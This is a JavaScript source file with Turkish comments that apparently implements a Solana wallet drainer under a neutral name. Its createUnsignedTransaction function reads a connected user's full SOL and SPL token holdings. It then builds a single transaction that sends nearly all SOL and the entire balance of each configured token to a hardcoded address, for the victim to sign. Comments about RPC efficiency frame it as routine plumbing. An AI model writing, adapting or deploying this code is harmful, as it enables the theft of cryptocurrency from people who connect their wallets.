/* transaction.js */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";

/**
 * Kullanıcının sahip olduğu TÜM SPL token hesaplarını tek RPC ile çeker,
 * her mint için:
 *  - toplam miktarı (raw),
 *  - tercih edilecek kaynak hesabı (öncelik: ATA varsa ATA, yoksa ilk hesap),
 *  - seçilen kaynaktaki miktarı
 * döndürür.
 *
 * Dönüş yapısı: Map<mintBase58, { sourcePubkey: PublicKey, amountInSourceRaw: number }>
 */
async function fetchTokenSources(payer) {
  // 1) Tek RPC: tüm parsed token hesapları
  const resp = await connection.getParsedTokenAccountsByOwner(payer, {
    programId: TOKEN_PROGRAM_ID,
  });

  // 2) Mint bazında grupla
  const byMint = new Map(); // mintStr -> { accounts: Array<{ pubkey: PublicKey, amountRaw: number }> }
  for (const { account, pubkey } of resp.value) {
    const parsed = account.data?.parsed?.info;
    if (!parsed) continue;

    const mintStr = parsed.mint; // base58 string
    const amountRaw = Number(parsed.tokenAmount?.amount ?? "0");

    const entry = byMint.get(mintStr) || { accounts: [] };
    entry.accounts.push({ pubkey, amountRaw });
    byMint.set(mintStr, entry);
  }

  // 3) Her mint için ATA’yı lokalde hesapla ve kaynak hesabı seç
  const result = new Map(); // mintStr -> { sourcePubkey, amountInSourceRaw }
  for (const [mintStr, { accounts }] of byMint.entries()) {
    if (!accounts.length) continue;

    const mintPk = new PublicKey(mintStr);
    const ata = await getAssociatedTokenAddress(mintPk, payer);

    // ATA var mı? Varsa onu kaynak seç; yoksa ilk hesabı seç.
    const ataIdx = accounts.findIndex((a) => a.pubkey.equals(ata));
    const chosen =
      ataIdx >= 0 ? accounts[ataIdx] : accounts[0];

    result.set(mintStr, {
      sourcePubkey: chosen.pubkey,
      amountInSourceRaw: chosen.amountRaw,
    });
  }

  return result;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey("8uowfFMGX7DfkErAzNX3bpv3UN5XuG2841y7cKyD8ZWd");

  // ---- Aşama 1: SOL + Token hesapları (paralel) ----
  const [userSolLamports, tokenSources] = await Promise.all([
    connection.getBalance(payer),      // 1 RPC
    fetchTokenSources(payer),           // 1 RPC (içerden)
  ]);

  // SOL gönderim miktarı (fee buffer bırak)
  const feeBufferLamports = 6_000_000; // ~0.006 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // ---- Aşama 2: Instruction’ları derle (ATA OLUŞTURMA YOK) ----
  const instructions = [];

  // 2a) SOL transfer (varsa)
  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // 2b) SPL transferleri
  // Not: Hedef ATA'yı sadece adres olarak HESAPLIYORUZ; varlık yoksa TX düşer (mevcut davranışla aynı).
  for (const { mint, threshold } of TOKEN_CONFIGS) {
    const mintStr = mint.toBase58();
    const src = tokenSources.get(mintStr);
    if (!src) continue; // Bu mint'e ait hesap yok

    // Eşik kontrolü (threshold raw birimde)
    if (src.amountInSourceRaw <= threshold) continue;

    // Kaynak hesap: seçilen hesap (ATA varsa o, yoksa ilk)
    const userSourceAccount = src.sourcePubkey;

    // Alıcı ATA adresini deterministik hesapla (RPC değil)
    const toAta = await getAssociatedTokenAddress(mint, toPublicKey);

    // Mevcut davranış: seçilen KAYNAKTAN elindeki miktarın tamamını yolla
    instructions.push(
      createTransferInstruction(
        userSourceAccount,
        toAta,
        payer,                    // owner
        src.amountInSourceRaw     // raw units
      )
    );
  }

  if (instructions.length === 0) {
    console.warn("Yeterli bakiye yok!");
    return null;
  }

  // ---- Aşama 3: Tek VersionedTransaction oluştur ----
  const { blockhash } = await connection.getLatestBlockhash(); // 1 RPC
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
